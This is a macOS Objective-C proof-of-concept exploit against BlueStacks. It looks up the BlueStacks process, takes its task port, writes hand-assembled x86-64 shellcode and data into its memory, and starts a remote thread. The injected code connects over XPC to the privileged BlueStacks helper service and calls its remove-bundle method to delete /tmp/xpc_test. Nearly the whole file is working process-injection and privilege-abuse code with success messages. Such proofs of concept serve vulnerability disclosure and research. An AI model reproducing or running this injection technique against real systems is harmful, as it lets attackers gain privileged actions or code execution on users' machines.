#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>

#include <dlfcn.h>
#include <stdint.h> 

#define STACK_SIZE 65536
#define CODE_SIZE 0x77E
#define DATA_SIZE 64

extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

char injectedCode[] =
    "\x90"                            // nop
    "\x55"                            // push       rbp
    "\x48\x89\xE5"                    // mov        rbp, rsp
    "\x48\x83\xEC\x10"                // sub        rsp, 0x10
    "\x48\x8D\x7D\xF8"                // lea        rdi, qword [rbp+var_8]       
    "\x31\xC0"                        // xor        eax, eax
    "\x89\xC1"                        // mov        ecx, eax                     
    "\x48\x8D\x15\x21\x00\x00\x00"    // lea        rdx, qword ptr [rip + 0x21]  
    "\x48\x89\xCE"                    // mov        rsi, rcx                     
    "\x48\xB8"                        // movabs     rax, pthread_create_from_mach_thread
	"__PTRD__"						  
	"\xFF\xD0"						  // call       rax
    "\x89\x45\xF4"                    // mov        dword [rbp+var_C], eax
    "\x48\x83\xC4\x10"                // add        rsp, 0x10
    "\x5D"                            // pop        rbp
    "\x48\xc7\xc0\x13\x0d\x00\x00"    // mov        rax, 0xD13
    "\xEB\xFE"                        // jmp        0x0
    "\xC3"                            // ret
    "\x90"							  // nop
    "\x55\x48\x89\xE5\x48\x81\xEC\xC0\x01\x00\x00\x48\x8D\x3D\xE4\x0F\x00\x00\x48\x8D\x35\xC7\x04\x00\x00\x48\x89\x37\x48\x8D\x3D\xDB\x0F\x00\x00\x48\x8D\x35\x9C\x0F\x00\x00\x48\x89\x37\x48\x8D\x3D\xA2\x0F\x00\x00\x48\x8D\x35\x87\x06\x00\x00\x48\x89\x37\x48\x8D\x3D\xC3\x04\x00\x00\xBE\x02\x00\x00\x00\xFF\x15\xA8\x04\x00\x00\x48\x89\x45\xD0\x48\x8B\x05\xA5\x04\x00\x00\x48\x8B\x7D\xD0\x48\x8D\x35\xBB\x04\x00\x00\xFF\xD0\x48\x89\x45\xF0\x48\x8B\x05\x8D\x04\x00\x00\x48\x8B\x7D\xD0\x48\x8D\x35\xB0\x04\x00\x00\xFF\xD0\x48\x89\x45\xF8\x48\x8B\x05\x75\x04\x00\x00\x48\x8B\x7D\xD0\x48\x8D\x35\xA6\x04\x00\x00\xFF\xD0\x48\x89\x45\xD8\x48\x8B\x05\x5D\x04\x00\x00\x48\x8B\x7D\xD0\x48\x8D\x35\x9F\x04\x00\x00\xFF\xD0\x48\x89\x45\xE8\x48\x8B\x05\x45\x04\x00\x00\x48\x8B\x7D\xD0\x48\x8D\x35\x9C\x04\x00\x00\xFF\xD0\x48\x89\x45\xE0\x48\x8B\x45\xF0\x48\x89\x45\xC8\x48\x8B\x45\xF0\x48\x89\x45\xC0\x48\x8B\x45\xF0\x48\x89\x45\xB8\x48\x8B\x45\xF0\x48\x89\x45\xB0\x48\x8B\x45\xF0\x48\x89\x45\xA8\x48\x8B\x45\xF0\x48\x89\x45\xA0\x48\x8B\x45\xF0\x48\x89\x45\x98\x48\x8D\x3D\x68\x04\x00\x00\xBE\x01\x00\x00\x00\xFF\x15\xE2\x03\x00\x00\x48\x89\x45\x90\x48\x8D\x3D\x9E\x04\x00\x00\xFF\x55\xF8\x31\xF6\x48\x89\x45\x88\x48\x8B\x45\xE8\x48\x8B\x7D\x88\xFF\xD0\x48\x89\x45\x80\x48\x8B\x45\xC8\x48\x8B\x7D\x80\x48\x8D\x0D\x8A\x04\x00\x00\x48\x89\xBD\x08\xFF\xFF\xFF\x48\x89\xCF\x48\x89\x85\x00\xFF\xFF\xFF\xFF\x55\xE0\x48\x8B\xBD\x08\xFF\xFF\xFF\x48\x89\xC6\x48\x8B\x85\x00\xFF\xFF\xFF\xFF\xD0\x48\x89\x85\x78\xFF\xFF\xFF\x48\x8D\x3D\x5A\x04\x00\x00\xFF\x55\xF8\x48\x89\x85\x70\xFF\xFF\xFF\xC7\x85\x6C\xFF\xFF\xFF\x04\x00\x00\x00\x48\x8B\x45\xC8\x48\x8B\xBD\x70\xFF\xFF\xFF\x48\x8D\x0D\x3D\x04\x00\x00\x48\x89\xBD\xF8\xFE\xFF\xFF\x48\x89\xCF\x48\x89\x85\xF0\xFE\xFF\xFF\xFF\x55\xE0\x48\x8B\xBD\xF8\xFE\xFF\xFF\x48\x89\xC6\x48\x8B\x85\xF0\xFE\xFF\xFF\xFF\xD0\x48\x89\x85\x60\xFF\xFF\xFF\x48\x8B\x45\xA0\x48\x8B\xBD\x60\xFF\xFF\xFF\x48\x8D\x0D\x03\x04\x00\x00\x48\x89\xBD\xE8\xFE\xFF\xFF\x48\x89\xCF\x48\x89\x85\xE0\xFE\xFF\xFF\xFF\x55\xE0\x8B\x8D\x6C\xFF\xFF\xFF\x48\x8B\xBD\xE8\xFE\xFF\xFF\x48\x89\xC6\x48\x8D\x15\xF2\x03\x00\x00\x48\x8B\x85\xE0\xFE\xFF\xFF\xFF\xD0\x48\x89\x85\x58\xFF\xFF\xFF\x48\x8D\x3D\x06\x04\x00\x00\xFF\x55\xF8\x31\xF6\x48\x89\x85\x50\xFF\xFF\xFF\x48\x8B\x45\xE8\x48\x8B\xBD\x50\xFF\xFF\xFF\xFF\xD0\x48\x89\x85\x48\xFF\xFF\xFF\x48\x8B\x45\xB0\x48\x8B\xBD\x48\xFF\xFF\xFF\x48\x8D\x15\xE4\x03\x00\x00\x48\x89\xBD\xD8\xFE\xFF\xFF\x48\x89\xD7\x48\x89\x85\xD0\xFE\xFF\xFF\xFF\x55\xE0\x48\x8B\x95\x58\xFF\xFF\xFF\x48\x8B\xBD\xD8\xFE\xFF\xFF\x48\x89\xC6\xB9\x00\x10\x00\x00\x48\x8B\x85\xD0\xFE\xFF\xFF\xFF\xD0\x48\x89\x85\x40\xFF\xFF\xFF\x48\x8D\x3D\xC4\x03\x00\x00\xFF\x55\xD8\x48\x89\x85\x38\xFF\xFF\xFF\x48\x8D\x3D\xC5\x03\x00\x00\xFF\x55\xF8\x48\x89\x85\x30\xFF\xFF\xFF\x48\x8B\x45\xB8\x48\x8B\xBD\x30\xFF\xFF\xFF\x48\x8D\x15\xB8\x03\x00\x00\x48\x89\xBD\xC8\xFE\xFF\xFF\x48\x89\xD7\x48\x89\x85\xC0\xFE\xFF\xFF\xFF\x55\xE0\x48\x8B\x95\x38\xFF\xFF\xFF\x48\x8B\xBD\xC8\xFE\xFF\xFF\x48\x89\xC6\x48\x8B\x85\xC0\xFE\xFF\xFF\xFF\xD0\x48\x89\x85\x28\xFF\xFF\xFF\x48\x8B\x45\xA8\x48\x8B\xBD\x40\xFF\xFF\xFF\x48\x8D\x15\x88\x03\x00\x00\x48\x89\xBD\xB8\xFE\xFF\xFF\x48\x89\xD7\x48\x89\x85\xB0\xFE\xFF\xFF\xFF\x55\xE0\x48\x8B\x95\x28\xFF\xFF\xFF\x48\x8B\xBD\xB8\xFE\xFF\xFF\x48\x89\xC6\x48\x8B\x85\xB0\xFE\xFF\xFF\xFF\xD0\x48\x8B\x55\xC8\x48\x8B\xBD\x40\xFF\xFF\xFF\x48\x8D\x35\x62\x03\x00\x00\x48\x89\xBD\xA8\xFE\xFF\xFF\x48\x89\xF7\x48\x89\x85\xA0\xFE\xFF\xFF\x48\x89\x95\x98\xFE\xFF\xFF\xFF\x55\xE0\x48\x8B\xBD\xA8\xFE\xFF\xFF\x48\x89\xC6\x48\x8B\x85\x98\xFE\xFF\xFF\xFF\xD0\x48\x8D\x3D\x56\x02\x00\x00\x48\x89\x85\x90\xFE\xFF\xFF\xFF\x55\xF8\x48\x89\x85\x20\xFF\xFF\xFF\xC7\x85\x6C\xFF\xFF\xFF\x04\x00\x00\x00\x48\x8B\x45\xC8\x48\x8B\xBD\x20\xFF\xFF\xFF\x48\x8D\x15\x32\x02\x00\x00\x48\x89\xBD\x88\xFE\xFF\xFF\x48\x89\xD7\x48\x89\x85\x80\xFE\xFF\xFF\xFF\x55\xE0\x48\x8B\xBD\x88\xFE\xFF\xFF\x48\x89\xC6\x48\x8B\x85\x80\xFE\xFF\xFF\xFF\xD0\x48\x89\x85\x60\xFF\xFF\xFF\x48\x8B\x45\xA0\x48\x8B\xBD\x60\xFF\xFF\xFF\x48\x8D\x15\xF8\x01\x00\x00\x48\x89\xBD\x78\xFE\xFF\xFF\x48\x89\xD7\x48\x89\x85\x70\xFE\xFF\xFF\xFF\x55\xE0\x8B\x8D\x6C\xFF\xFF\xFF\x48\x8B\xBD\x78\xFE\xFF\xFF\x48\x89\xC6\x48\x8D\x15\x9C\x02\x00\x00\x48\x8B\x85\x70\xFE\xFF\xFF\xFF\xD0\x48\x8D\x15\xBE\x0B\x00\x00\x48\x89\x85\x58\xFF\xFF\xFF\x48\x89\x95\x18\xFF\xFF\xFF\x48\x8B\x45\xC8\x48\x8B\xBD\x40\xFF\xFF\xFF\x48\x8D\x15\x83\x02\x00\x00\x48\x89\xBD\x68\xFE\xFF\xFF\x48\x89\xD7\x48\x89\x85\x60\xFE\xFF\xFF\xFF\x55\xE0\x48\x8B\xBD\x68\xFE\xFF\xFF\x48\x89\xC6\x48\x8B\x85\x60\xFE\xFF\xFF\xFF\xD0\x48\x89\x85\x10\xFF\xFF\xFF\x48\x8B\x45\x98\x48\x8B\xBD\x10\xFF\xFF\xFF\x48\x8D\x15\x55\x02\x00\x00\x48\x89\xBD\x58\xFE\xFF\xFF\x48\x89\xD7\x48\x89\x85\x50\xFE\xFF\xFF\xFF\x55\xE0\x48\x8B\x95\x58\xFF\xFF\xFF\x48\x8B\xB5\x18\xFF\xFF\xFF\x48\x8B\xBD\x58\xFE\xFF\xFF\x48\x89\xB5\x48\xFE\xFF\xFF\x48\x89\xC6\x48\x8B\x8D\x48\xFE\xFF\xFF\x48\x8B\x85\x50\xFE\xFF\xFF\xFF\xD0\x48\x81\xC4\xC0\x01\x00\x00\x5D\xC3\x66\x2E\x0F\x1F\x84\x00\x00\x00\x00\x00\x66\x90\x55\x48\x89\xE5\x48\x89\x7D\xF8\x40\x80\xE6\x01\x40\x88\x75\xF7\x48\x89\x7D\xE8\x5D\xC3\x66\x90"
    "__DLOP__"						  // DLOPEN adddress
    "__DLYS__"						  // DLSYM addresss
    "\x2F\x75\x73\x72\x2F\x6C\x69\x62\x2F\x6C\x69\x62\x6F\x62\x6A\x63\x2E\x41\x2E\x64\x79\x6C\x69\x62\x00\x6F\x62\x6A\x63\x5F\x6D\x73\x67\x53\x65\x6E\x64\x00\x6F\x62\x6A\x63\x5F\x67\x65\x74\x43\x6C\x61\x73\x73\x00\x6F\x62\x6A\x63\x5F\x67\x65\x74\x50\x72\x6F\x74\x6F\x63\x6F\x6C\x00\x63\x6C\x61\x73\x73\x5F\x63\x72\x65\x61\x74\x65\x49\x6E\x73\x74\x61\x6E\x63\x65\x00\x73\x65\x6C\x5F\x72\x65\x67\x69\x73\x74\x65\x72\x4E\x61\x6D\x65\x00\x2F\x53\x79\x73\x74\x65\x6D\x2F\x4C\x69\x62\x72\x61\x72\x79\x2F\x46\x72\x61\x6D\x65\x77\x6F\x72\x6B\x73\x2F\x46\x6F\x75\x6E\x64\x61\x74\x69\x6F\x6E\x2E\x66\x72\x61\x6D\x65\x77\x6F\x72\x6B\x2F\x56\x65\x72\x73\x69\x6F\x6E\x73\x2F\x43\x75\x72\x72\x65\x6E\x74\x2F\x46\x6F\x75\x6E\x64\x61\x74\x69\x6F\x6E\x00\x4E\x53\x41\x75\x74\x6F\x72\x65\x6C\x65\x61\x73\x65\x50\x6F\x6F\x6C\x00\x69\x6E\x69\x74\x00\x4E\x53\x53\x74\x72\x69\x6E\x67\x00\x61\x6C\x6C\x6F\x63\x00\x69\x6E\x69\x74\x57\x69\x74\x68\x43\x53\x74\x72\x69\x6E\x67\x3A\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3A\x00\x63\x6F\x6D\x2E\x42\x6C\x75\x65\x53\x74\x61\x63\x6B\x73\x2E\x41\x70\x70\x50\x6C\x61\x79\x65\x72\x2E\x62\x73\x74\x73\x65\x72\x76\x69\x63\x65\x5F\x68\x65\x6C\x70\x65\x72\x00\x4E\x53\x58\x50\x43\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x00\x69\x6E\x69\x74\x57\x69\x74\x68\x4D\x61\x63\x68\x53\x65\x72\x76\x69\x63\x65\x4E\x61\x6D\x65\x3A\x6F\x70\x74\x69\x6F\x6E\x73\x3A\x00\x48\x65\x6C\x70\x65\x72\x49\x70\x63\x50\x72\x6F\x74\x6F\x63\x6F\x6C\x00\x4E\x53\x58\x50\x43\x49\x6E\x74\x65\x72\x66\x61\x63\x65\x00\x69\x6E\x74\x65\x72\x66\x61\x63\x65\x57\x69\x74\x68\x50\x72\x6F\x74\x6F\x63\x6F\x6C\x3A\x00\x73\x65\x74\x52\x65\x6D\x6F\x74\x65\x4F\x62\x6A\x65\x63\x74\x49\x6E\x74\x65\x72\x66\x61\x63\x65\x3A\x00\x72\x65\x73\x75\x6D\x65\x00\x2F\x74\x6D\x70\x2F\x78\x70\x63\x5F\x74\x65\x73\x74\x00\x76\x31\x32\x40\x3F\x30\x42\x38\x00\x72\x65\x6D\x6F\x74\x65\x4F\x62\x6A\x65\x63\x74\x50\x72\x6F\x78\x79\x00\x72\x65\x6D\x6F\x76\x65\x42\x75\x6E\x64\x6C\x65\x41\x74\x50\x61\x74\x68\x3A\x63\x6F\x6E\x74\x69\x6E\x75\x61\x74\x69\x6F\x6E\x3A\x00";

char injectedData[] = 				  
	"\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x44\x44\x44\x44\x44\x44\x44\x44\x00\x00\x00\x00\x00\x00\x00\x00"
	"__BLOC__"						  // BLOCK class address
	"\x00\x00\x00\x50\x00\x00\x00\x00\x11\x11\x11\x11\x11\x11\x11\x11\x22\x22\x22\x22\x22\x22\x22\x22";
																																					 																											
pid_t getBlueStacksPID() {
    
    NSString *BlueStacksBundleID = @"com.bluestacks.BlueStacks";
    NSArray<NSRunningApplication *> *runningBlueStacks = [NSRunningApplication runningApplicationsWithBundleIdentifier:BlueStacksBundleID];
    
    if (runningBlueStacks == nil || [runningBlueStacks count] == 0) {
        printf("[!] Exploit failed! There is not any BlueStacks running\n");
        exit(-1);
    }
    
    NSRunningApplication *BlueStacks = runningBlueStacks[0];
    pid_t BlueStacksPID = [BlueStacks processIdentifier];
    
    printf("[+] BlueStacks is running with PID: %d\n", BlueStacksPID);
    return BlueStacksPID;
}

void find_and_replace_symbol(char* symbol, void* replace)
{
	uint8_t* ptr = &replace; 
	for(int i = 0; i < CODE_SIZE; i++) 
	{
		if(memcmp(symbol, injectedCode+i, 8) == 0)
		{
			for(int j = 0; j < 8; j++) 
			{ 
				injectedCode[i+j] = ptr[j];
			}
		}
	}
}

int main(int argc, const char * argv[]) {

    printf("=== Starting BlueStacks exploit ===\n");
    printf("[+] Resolving symbols required for shellcode [pthread_create_from_mach_thread, dlopen, dlsym, _NSConcreteGlobalBlock]\n");

    void * lidpthread_handle = dlopen("/usr/lib/system/libsystem_pthread.dylib", RTLD_LAZY);
    void * lipthread_ptr = dlsym(lidpthread_handle, "pthread_create_from_mach_thread");

    find_and_replace_symbol("__PTRD__", lipthread_ptr);
    printf("[+] Resolved pthread_create_from_mach_thread to: %p\n", lipthread_ptr);
	
    void *libdyld_handle = dlopen("/usr/lib/system/libdyld.dylib", RTLD_LAZY);
    void * dlopen_ptr = dlsym(libdyld_handle, "dlopen");

    find_and_replace_symbol("__DLOP__", dlopen_ptr);
    printf("[+] Resolved dlopen to: %p\n", dlopen_ptr);

    void * dlsym_ptr = dlsym(libdyld_handle, "dlsym");

    find_and_replace_symbol("__DLYS__", dlsym_ptr);
    printf("[+] Resolved dlsym to: %p\n", dlsym_ptr);

    void *lidobjc_handle = dlopen("/usr/lib/libobjc.A.dylib", RTLD_LAZY);
    void * block_ptr = dlsym(lidobjc_handle, "_NSConcreteGlobalBlock");

    find_and_replace_symbol("__BLOC__", block_ptr);
    printf("[+] Resolved _NSConcreteGlobalBlock to: %p\n", block_ptr);

    @autoreleasepool {
        
        pid_t iExplorerPID = getBlueStacksPID();
        
        task_t remoteTask;
        kern_return_t kr = task_for_pid(current_task(), iExplorerPID, &remoteTask);
        
        if (kr != KERN_SUCCESS) {
            printf("[!] Failed to get BlueStacks's task: %s\n", mach_error_string(kr));
            exit(-2);
        } else {
            printf("[+] BlueStacks's task successfully taken over\n");
        }
        
        mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
        mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
        mach_vm_address_t remoteData64 = (vm_address_t) NULL;
        
        kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
        
        if (kr != KERN_SUCCESS) {
            printf("[!] Failed to allocate stack memory in BlueStacks's thread: %s\n", mach_error_string(kr));
            exit(-3);
        } else {
            printf("[+] Allocated remote stack: 0x%llx\n", remoteStack64);
        }

        kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
        
        if (kr != KERN_SUCCESS) {
            printf("[!] Failed to allocate code memory in BlueStacks's thread: %s\n", mach_error_string(kr));
            exit(-3);
        } else {
            printf("[+] Allocated remote code placeholder: 0x%llx\n", remoteCode64);
        }

        kr = mach_vm_write(remoteTask, remoteCode64, (vm_address_t) injectedCode, CODE_SIZE);
        
        if (kr != KERN_SUCCESS) {
            printf("[!] Failed to write into remote thread memory: %s\n", mach_error_string(kr));
            exit(-4);
        }

        remoteData64 = remoteCode64 + 0x1000;
        kr = mach_vm_allocate( remoteTask, &remoteData64, DATA_SIZE, VM_FLAGS_ANYWHERE);

        if (kr != KERN_SUCCESS) {
            printf("[!] Failed to allocate data memory in BlueStacks's thread: %s\n", mach_error_string(kr));
            exit(-3);
        } else {
            printf("[+] Allocated remote data placeholder: 0x%llx\n", remoteData64);
        }

        if (remoteData64 != remoteCode64 + 0x1000)
        {
            printf("[!] Failed to allocate data memory in the page after code exiting");
            return -1;
        }  
       
        kr = mach_vm_write(remoteTask, remoteData64, (vm_address_t) injectedData, DATA_SIZE);
        
        if (kr != KERN_SUCCESS) {
            printf("[!] Failed to write into remote thread memory: %s\n", mach_error_string(kr));
            exit(-4);
        }

        kr  = vm_protect(remoteTask, remoteData64, DATA_SIZE, FALSE, VM_PROT_READ | VM_PROT_WRITE);
        kr  = vm_protect(remoteTask, remoteCode64, CODE_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
        kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
        
        if (kr != KERN_SUCCESS) {
            printf("[!] Failed to give injected memory proper permissions: %s\n", mach_error_string(kr));
            exit(-5);
        }

        x86_thread_state64_t remoteThreadState64;
        thread_act_t remoteThread;
        memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
        remoteStack64 += (STACK_SIZE / 2);
        const char* p = (const char*) remoteCode64;

        remoteThreadState64.__rip = (u_int64_t) (vm_address_t) remoteCode64;
        remoteThreadState64.__rsp = (u_int64_t) remoteStack64;
        remoteThreadState64.__rbp = (u_int64_t) remoteStack64;

        printf ("[+] Remote stack is @0%p,  Remote code is @%p,  Remote data is @%p\n", remoteStack64, p , remoteData64);

        kr = thread_create_running( remoteTask, x86_THREAD_STATE64,
                                   (thread_state_t) &remoteThreadState64, x86_THREAD_STATE64_COUNT, &remoteThread );
        
        if (kr != KERN_SUCCESS) {
            printf("[!] Exploit failed: error %s\n", mach_error_string (kr));
            return (-3);
        }
        
        printf("[+] Exploit succeeded! Check /tmp/xpc_test and it should be deleted\n");
        
        return (0);
        
    }
    return 0;
}
